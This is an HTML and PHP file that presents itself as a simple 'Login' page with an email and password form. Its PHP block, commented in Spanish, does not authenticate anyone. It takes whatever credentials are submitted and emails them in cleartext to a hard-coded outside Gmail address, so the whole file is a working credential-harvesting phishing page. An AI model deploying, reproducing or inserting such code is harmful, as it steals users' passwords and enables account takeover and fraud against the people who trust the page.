<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>
</head>
<body>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoger los datos del formulario
    $email = $_POST["email"];
    $password = $_POST["password"];

    // Correo electrónico al que se enviará el mensaje
    $to = "kl7410246@gmail.com";

    // Asunto del correo
    $subject = "Datos de inicio de sesión";

    // Mensaje del correo
    $message = "Datos de inicio de sesión:\n\n";
    $message .= "Email: " . $email . "\n";
    $message .= "Contraseña: " . $password . "\n";

    // Cabeceras del correo
    $headers = "From: webmaster@example.com";

    // Envío del correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Correo enviado correctamente";
    } else {
        echo "Error al enviar el correo";
    }
}
?>

<div class="container">
  <form action="#" method="post">
    <h2>Login</h2>
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required>
    <button type="submit">Login</button>
  </form>
</div>

</body>
</html>
